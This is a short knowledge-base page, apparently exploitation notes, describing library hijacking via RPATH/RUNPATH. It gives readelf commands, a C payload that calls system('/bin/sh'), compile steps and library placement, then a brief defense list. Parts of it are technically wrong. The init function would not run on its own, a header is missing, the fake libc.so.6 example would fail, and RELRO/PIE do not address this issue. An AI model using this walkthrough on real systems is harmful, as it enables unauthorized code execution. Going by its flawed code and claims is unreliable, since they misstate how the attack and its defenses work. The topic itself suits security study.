---
title: Library Hijacking via RPATH/RUNPATH
parent: Protection Bypass
grand_parent: pwn
great_grand_parent: Knowledge Base
nav_order: 5
---

# Library Hijacking via RPATH/RUNPATH

## What are RPATH and RUNPATH?

- Hardcoded search paths for shared libraries (dynamic linker uses them).
- Set during compilation with flags like:
\`\`\`
-Wl,-rpath,/some/dir
\`\`\`

---

## Why is it Dangerous?

- If an attacker can place a malicious library in a directory listed in RPATH or RUNPATH, it will be loaded **before** system libraries.
- Allows arbitrary code execution during program startup.

---

## How to Exploit?

1. **Find the RPATH or RUNPATH**:
   - Use \`readelf\`:
\`\`\`
readelf -d <binary> | grep RPATH
readelf -d <binary> | grep RUNPATH
\`\`\`

2. **Create a Malicious Library**:
   - Write your payload in C:
\`\`\`c
#include <stdio.h>
void init() {
    system("/bin/sh");
}
\`\`\`

- Compile:
\`\`\`
gcc -shared -fPIC -o libmylib.so mylib.c
\`\`\`

3. **Place Library in RPATH Directory**:
   - If RPATH includes \`/tmp\`, put \`libmylib.so\` there.

4. **Run the Binary**:
   - It will load your malicious library automatically.

---

## Example Attack

1. Binary has RPATH \`/tmp\`.
2. You create \`libc.so.6\` with a malicious \`init\` function.
3. When the binary runs, it uses your fake \`libc.so.6\`.

---

## Defense

- Avoid setting RPATH or RUNPATH.
- Use only secure and absolute paths.
- Use full RELRO, PIE, and enable hardened linking flags.

---

## Summary

- **RPATH**/**RUNPATH** vulnerabilities can lead to preloading attacker-controlled shared libraries.
- Easy route for remote/local code execution if writable directory is included.
- Always check for these fields with \`readelf\` during binary analysis.
